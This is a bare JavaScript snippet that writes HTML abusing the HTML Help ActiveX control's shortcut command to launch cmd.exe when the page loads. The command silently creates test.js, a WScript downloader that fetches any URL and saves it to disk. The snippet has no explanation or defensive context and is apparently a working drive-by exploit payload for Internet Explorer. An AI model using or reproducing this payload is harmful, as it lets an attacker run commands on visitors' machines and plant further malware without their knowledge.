mystr="<object id=a classid=clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11>"+
      "<param name=command value=shortcut>"+
      "<param name=item1 value=',cmd.exe, /c echo var arguments = WScript.Arguments;var url = arguments(0);var proxyAddress = \"\";if (arguments.Count() == 2) {    proxyAddress = arguments(1);}var lastIndex=url.lastIndexOf(\"/\"); var filename = url.substr(lastIndex + 1);if (filename == \"\") {    filename = \"index.html\";}var xml = WScript.CreateObject(\"WinHttp.WinHttpRequest.5.1\");if (proxyAddress != \"\") {	xml.setProxy(2, proxyAddress);}xml.open(\"GET\", url, false);xml.send();var bodyStream = xml.responseBody;var fso = WScript.CreateObject(\"Scripting.FileSystemObject\");if (fso.FileExists(filename)) {	fso.DeleteFile(filename);}var stream = WScript.CreateObject(\"ADODB.Stream\");stream.type = 1;stream.open();stream.write(bodyStream);stream.saveToFile(filename);stream.flush();stream.close(); > test.js'>"+
      "</object>"+
      "<object id=b classid=clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11>"+
      "<param name=command value=close>"+
      "</object>"+
      "<script>"+
      	"a.Click\(\);"+
      	"b.Click\(\);"+
      "</script>"
document.write(mystr);

